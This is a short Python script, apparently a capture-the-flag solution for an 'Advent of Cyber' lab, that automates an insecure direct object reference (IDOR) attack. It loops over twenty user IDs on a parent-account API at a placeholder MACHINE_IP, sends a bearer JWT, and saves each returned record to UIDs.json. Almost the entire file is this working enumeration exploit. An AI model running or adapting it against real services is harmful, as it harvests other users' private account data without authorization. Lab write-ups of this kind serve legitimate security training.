import requests
import json

banner = """
             /\\
            <  >
             \\/
             /\\
            /  \\
           /++++\\
          /  ()  \\
          /      \\
         /~`~`~`~`\\
        /  ()  ()  \\
        /          \\
       /*&*&*&*&*&*&\\
      /  ()  ()  ()  \\
      /              \\
     /++++++++++++++++\\
    /  ()  ()  ()  ()  \\
    /                  \\
   /~`~`~`~`~`~`~`~`~`~`\\
  /  () ()  ()  ()  ()  \\
  /*&*&*&*&*&*&*&*&*&*&*&\\
 /                        \\
/,.,.,.,.,.,.,.,.,.,.,.,.,.\\
           |   |
          |`````|
          \\_____/
    Happy Advent Of Cyber from MuteAvery
"""


def IDOR():
    # scan 20 user IDs by taking a range in this case we for loop in a range of 20 then we re create the web request that what vuln to idor
    for UID in range(0, 20):
        # this is the url in which is vuln to idor, simply the UID portion at the end will be replaced in each request with a UID like 5
        url = f"http://MACHINE_IP/api/parents/view_accountinfo?user_id={UID}"

        # this is the login data we will parse so our requests have the correct permisions to view the data, with out this we will get a "Not authenticated" or if your JWT token is invalid "invalid token"
        jwt_token = "YOUR JWT TOKEN"
        headers = {
            "Authorization": f"Bearer {jwt_token}",
            "Content-Type": "application/json",
        }

        # Send the GET request to the API then save that request to a var called r
        r = requests.get(url=url, headers=headers)

        # Check if the response contains the "Parent not found" text, if so, skip this UID as it  will not contain usefull data
        if "Parent not found" in r.text:
            continue

        # If valid data is returned, log it to the output file UIDS.json
        try:
            # Call r.json() to parse the response as JSON
            user_data = r.json()

            # Append the formatted JSON to the UIDs.json file
            with open("UIDs.json", "a") as f:
                # we ustilise indents and newlines to create a neat output file
                f.write(json.dumps(user_data, indent=4))
                f.write("\n")

                # simple error handling to tell the user that it ran into issues with a request
        except Exception as e:
            print(f"Error processing user {UID}: {e}")


# Main function to run the IDOR automated process
def main():
    print(banner)
    IDOR()


# Run the main function
if __name__ == "__main__":
    main()
